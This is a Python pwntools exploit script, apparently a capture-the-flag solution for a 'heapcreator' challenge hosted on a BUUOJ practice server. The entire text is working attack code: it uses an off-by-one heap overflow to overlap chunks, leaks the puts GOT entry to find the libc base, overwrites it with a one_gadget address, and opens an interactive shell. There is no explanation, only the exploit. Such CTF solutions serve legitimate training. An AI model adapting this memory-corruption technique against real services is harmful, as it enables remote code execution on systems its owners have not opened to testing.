from pwn import *
r = remote('node3.buuoj.cn',25620)
#r = process('./heapcreator')
elf = ELF('./heapcreator')
libc = ELF('/libc-2.23.so')

def create(szie,content):
	r.recvuntil('Your choice :')
	r.sendline('1')
	r.recvuntil(':')
	r.sendline(str(szie))
	r.recvuntil(':')
	r.sendline(content)

def edit(index,content):
	r.recvuntil('Your choice :')
	r.sendline('2')
	r.recvuntil(':')
	r.sendline(str(index))
	r.recvuntil(':')
	r.sendline(content)

def show(index):
	r.recvuntil('Your choice :')
	r.sendline('3')
	r.recvuntil(':')
	r.sendline(str(index))

def free(index):
	r.recvuntil('Your choice :')
	r.sendline('4')
	r.recvuntil(':')
	r.sendline(str(index))

puts_got = elf.got['puts']
create(0x18,'fuck')
create(0x18,'fuck')
edit(0,'a'*0x18+'\x41')
free(1)
create(0x38,'aaaa')
edit(1,p64(0)*3+p64(0x21)+p64(0x38)+p64(puts_got))
show(1)
r.recvuntil('Content : ')
leak = r.recvuntil('\n',drop=True)
leak = leak.ljust(8,'\x00')
leak = u64(leak)
log.success(hex(leak))
libc_base = leak - libc.sym['puts']
log.success(hex(libc_base))
one = libc_base + 0xf02a4
edit(1,p64(one))

r.interactive()